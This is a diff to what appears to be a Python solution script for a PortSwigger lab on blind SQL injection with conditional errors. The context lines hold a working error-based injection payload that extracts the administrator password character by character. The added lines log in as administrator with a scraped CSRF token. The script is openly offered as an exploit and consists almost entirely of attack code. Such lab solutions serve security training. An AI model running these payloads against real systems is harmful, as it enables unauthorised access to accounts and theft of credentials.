@@ -2,6 +2,7 @@
 # Lab: Blind SQL injection with conditional errors
 # Lab-Link: <https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors>
 # Difficulty: PRACTITIONER
+from bs4 import BeautifulSoup
 import requests
 import sys
 import urllib3
@@ -75,7 +76,7 @@ def get_admin_password(length):
     chars = [x for x in range(48, 58)] + [x for x in range(97, 123)]
     print(f'[ ] Enumerating administrator password. This takes {length*len(chars)} requests, so might take a while')
     sys.stdout.write('\r[ ] Current extraction status: ')
-    sys.stdout.flush()    
+    sys.stdout.flush()
     for i in range(1, length + 1):
         for j in chars:
             if send_request(f"'||(SELECT CASE WHEN (SUBSTR(password,{i},1)='{chr(j)}') THEN to_char(1/0) ELSE null END FROM users WHERE username='administrator')||'"):
@@ -90,6 +91,28 @@ def get_admin_password(length):
 
     print(f'[-] Failed to find administrator password, extracted only {len(password)} characters, expected {length}')
     sys.exit(-5)
+
+
+def login(host, password):
+    def get_csrf_token(client, url):
+        r = client.get(url)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        return soup.find('input', attrs={'name': 'csrf'})['value']
+    client = requests.Session()
+    client.proxies = proxies
+    client.verify = False
+
+    url = f"{host}/login"
+    csrf = get_csrf_token(client, url)
+    if not csrf:
+        print(f'[-] Unable to obtain csrf token')
+        sys.exit(-2)
+
+    payload = {'csrf': csrf,
+               'username': 'administrator',
+               'password': password}
+    r = client.post(url, data=payload, allow_redirects=True)
+    return 'Congratulations, you solved the lab!' in r.text
 
 
 if __name__ == '__main__':
@@ -113,3 +136,9 @@ if __name__ == '__main__':
 
         admin_password = get_admin_password(password_length)
         print(f'[+] Found administrator password: {admin_password}')
+
+        print('[ ] Try to login as administrator')
+        if login(host, admin_password):
+            print('[+] Login as administrator successful')
+        else:
+            print('[-] Failed to login as administrator')
